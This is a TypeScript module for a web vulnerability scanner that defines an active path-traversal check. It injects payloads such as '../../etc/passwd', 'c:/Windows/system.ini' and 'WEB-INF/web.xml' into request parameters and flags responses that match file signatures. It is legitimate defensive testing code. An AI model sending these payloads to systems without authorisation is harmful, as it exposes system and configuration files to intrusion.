import {
  continueWith,
  defineCheck,
  done,
  ScanAggressivity,
  Severity,
} from "engine";

import { Tags } from "../../types";
import {
  bodyMatchesAny,
  extractParameters,
  hasParameters,
  type Parameter,
} from "../../utils";
import { keyStrategy } from "../../utils/key";

type PayloadList = {
  payloads: string[];
  patterns: RegExp[];
};

const PAYLOADS: PayloadList[] = [
  {
    payloads: [
      "c:/Windows/system.ini",
      "../../../../../../../../../../../../Windows/system.ini",
      "c:\\Windows\\system.ini",
      "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini",
      "file:///c:/Windows/system.ini",
      "file:///c:\\Windows\\system.ini",
      "d:/Windows/system.ini",
      "d:\\Windows\\system.ini",
      "/../../../../../../../../../../../../Windows/system.ini",
      "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini",
    ],
    patterns: [/\[drivers\]/i],
  },
  {
    payloads: [
      "/etc/passwd",
      "../../../../../../../../../../../../etc/passwd",
      "/../../../../../../../../../../../../etc/passwd",
      "etc/passwd",
      "file:///etc/passwd",
      "file:\\\\\\etc/passwd",
    ],
    patterns: [/root:.:0:0/],
  },
  {
    payloads: [
      "WEB-INF/web.xml",
      "../WEB-INF/web.xml",
      "../../WEB-INF/web.xml",
      "../../../WEB-INF/web.xml",
      "/WEB-INF/web.xml",
      "WEB-INF\\web.xml",
      "..\\WEB-INF\\web.xml",
      "\\WEB-INF\\web.xml",
    ],
    patterns: [/<\/web-app>/i],
  },
];

export default defineCheck<{
  parameters: Parameter[];
}>(({ step }) => {
  step("findParameters", (state, context) => {
    const parameters = extractParameters(context);
    if (parameters.length === 0) {
      return done({ state });
    }

    return continueWith({
      nextStep: "testParameter",
      state: {
        ...state,
        parameters,
      },
    });
  });

  step("testParameter", async (state, context) => {
    if (state.parameters.length === 0) {
      return done({ state });
    }

    const [currentParam, ...remainingParams] = state.parameters;
    if (!currentParam) {
      return done({ state });
    }

    let payloads = [...PAYLOADS];
    if (context.config.aggressivity === ScanAggressivity.LOW) {
      payloads = PAYLOADS.map((target) => ({
        ...target,
        payloads: target.payloads.slice(0, 2),
      }));
    } else if (context.config.aggressivity === ScanAggressivity.MEDIUM) {
      payloads = PAYLOADS.map((target) => ({
        ...target,
        payloads: target.payloads.slice(0, 4),
      }));
    }

    for (const payloadSet of payloads) {
      for (const payload of payloadSet.payloads) {
        const requestSpec = currentParam.inject(payload);
        const { request, response } =
          await context.sdk.requests.send(requestSpec);

        if (bodyMatchesAny(response, payloadSet.patterns)) {
          return done({
            findings: [
              {
                name: "Path Traversal in parameter '" + currentParam.name + "'",
                description: `Parameter \`${currentParam.name}\` in ${currentParam.source} allows path traversal access to system files.\n\n**Payload used:**\n\`\`\`\n${payload}\n\`\`\`\n\nThe response contained sensitive file content matching the expected pattern.`,
                severity: Severity.CRITICAL,
                correlation: {
                  requestID: request.getId(),
                  locations: [],
                },
              },
            ],
            state: { parameters: remainingParams },
          });
        }
      }
    }

    if (remainingParams.length === 0) {
      return done({
        findings: [],
        state: { parameters: remainingParams },
      });
    }

    return continueWith({
      nextStep: "testParameter",
      state: {
        ...state,
        parameters: remainingParams,
      },
    });
  });

  return {
    metadata: {
      id: "path-traversal",
      name: "Path Traversal",
      description:
        "Detects path traversal vulnerabilities by attempting to access system files and directories",
      type: "active",
      tags: [Tags.INFORMATION_DISCLOSURE],
      severities: [Severity.CRITICAL],
      aggressivity: {
        minRequests: 0,
        maxRequests: "Infinity",
      },
    },
    dedupeKey: keyStrategy()
      .withMethod()
      .withHost()
      .withPort()
      .withPath()
      .withQueryKeys()
      .build(),
    initState: () => ({
      parameters: [],
    }),
    when: (target) => hasParameters(target),
  };
});
